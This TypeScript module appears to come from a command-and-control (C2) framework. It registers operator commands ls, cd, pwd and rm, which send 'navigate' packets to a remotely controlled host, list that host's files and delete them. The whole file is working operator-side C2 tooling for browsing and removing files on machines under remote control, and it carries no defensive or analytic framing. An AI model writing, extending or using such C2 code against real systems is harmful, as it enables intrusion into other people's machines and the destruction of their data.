import { FileData } from "c2lib";
import { ControlServer } from "../../controlserver";
import { CommandList } from "../../registry";

const COMMAND_LS = 0;
const COMMAND_CD = 1;
const COMMAND_PWD = 2;
const COMMAND_RM = 3;

const FILE_ATTRIBUTE_DIRECTORY = 0x10;

export = function (commands: CommandList) {
    commands['ls'] = ls;
    commands['cd'] = cd;
    commands['rm'] = rm;
    commands['pwd'] = pwd;
};

async function ls(server: ControlServer, args: string[]) {
    if (args.length > 2) {
        console.log(`Usage: ${args[0]} [dir]`);
        return;
    }

    let packet = server.commandPacket('navigate');
    packet.command = COMMAND_LS;
    if (args.length == 2) {
        packet.path = args[1];
    } else {
        packet.path = '';
    }
    await server.sendHostCommand(packet);
    let responsePacket = await server.waitForPacket('files');
    for (let file of responsePacket.files as FileData[]) {
        let dir = '';
        if ((file.attrs & FILE_ATTRIBUTE_DIRECTORY) != 0) {
            dir = '/';
        }
        let size = Number(file.size);
        let unit = '';
        if (size >= 1024) {
            size = Math.floor(size / 1024);
            unit = 'KiB';
        }
        if (size >= 1024) {
            size = Math.floor(size / 1024);
            unit = 'MiB';
        }
        if (size >= 1024) {
            size = Math.floor(size / 1024);
            unit = 'GiB';
        }
        console.log(`${size}${unit}\t${file.name}${dir}`);
    }
}

async function cd(server: ControlServer, args: string[]) {
    if (args.length != 2) {
        console.log(`Usage: ${args[0]} <dir>`);
        return;
    }

    let packet = server.commandPacket('navigate');
    packet.command = COMMAND_CD;
    packet.path = args[1];
    await server.sendHostCommand(packet);
}

async function pwd(server: ControlServer, args: string[]) {
    let packet = server.commandPacket('navigate');
	packet.command = COMMAND_PWD;
	packet.path = '';
    await server.sendHostCommand(packet);
}

async function rm(server: ControlServer, args: string[]) {
    if (args.length != 2) {
        console.log(`Usage: ${args[0]} <file>`);
        return;
    }

    let packet = server.commandPacket('navigate');
    packet.command = COMMAND_RM;
    packet.path = args[1];
    await server.sendHostCommand(packet);
}
